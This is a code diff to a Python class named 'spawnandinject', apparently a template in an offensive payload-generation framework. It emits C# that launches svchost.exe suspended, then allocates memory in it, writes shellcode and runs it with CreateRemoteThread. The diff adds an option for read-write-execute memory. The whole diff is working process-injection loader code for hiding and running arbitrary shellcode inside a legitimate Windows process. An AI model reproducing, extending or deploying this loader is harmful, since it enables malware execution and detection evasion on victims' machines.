@@ -1,4 +1,10 @@
 class spawnandinject:
+    def __init__(self, arguments):
+        if 'perm' in arguments:
+            if arguments['perm'] == 'rwx':
+                self.memoryPermission = '0x40'
+            else:
+                self.memoryPermission = '0x20'
 
     def imports(self) -> list[str]:
         return ["using System;",
@@ -12,8 +18,8 @@ class spawnandinject:
     def compilerOptions(self) -> list[str]:
         return []
 
-    def template(self) -> str:
-        return """
+    def template(self, imports, codeblocks, transformers, shellcodeSize) -> str:
+        return f"""
 {imports}
 
 [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
@@ -124,14 +130,12 @@ namespace ClassLibrary1
 
             CreateProcess(null, "C:\\\\Windows\\\\System32\\\\svchost.exe", IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
 
-            ;
-
             {transformers}
 
             IntPtr bytesWritten;
             IntPtr threadId;
 
-            IntPtr pRemoteCode = VirtualAllocEx(pi.hProcess, IntPtr.Zero, {shellcodeSize}, 0x3000, 0x20);
+            IntPtr pRemoteCode = VirtualAllocEx(pi.hProcess, IntPtr.Zero, {shellcodeSize}, 0x3000, {self.memoryPermission});
             WriteProcessMemory(pi.hProcess, pRemoteCode, shellcode, {shellcodeSize}, out bytesWritten);
             IntPtr hThread = CreateRemoteThread(pi.hProcess, IntPtr.Zero, 0, pRemoteCode, IntPtr.Zero, 0, out threadId);
             WaitForSingleObject(hThread, 500);
